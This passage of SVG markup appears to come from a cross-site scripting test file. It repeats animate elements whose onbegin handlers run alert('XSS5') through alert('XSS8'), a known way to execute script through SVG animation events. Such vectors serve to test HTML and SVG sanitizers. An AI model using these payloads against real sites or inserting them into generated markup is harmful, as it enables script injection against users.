             onbegin="alert('XSS5')" />
    <animate attributeName="width" from="0" to="0" begin="0s" dur="0.001s"
             onbegin="alert('XSS6')" />
    <animate attributeName="width" from="0" to="0" begin="0s" dur="0.001s"
             onbegin="alert('XSS7')" />
    <animate attributeName="width" from="0" to="0" begin="0s" dur="0.001s"
             onbegin="alert('XSS8')" />
    <animate attributeName="width" from="0" to="0" begin="0s" dur="0.001s"
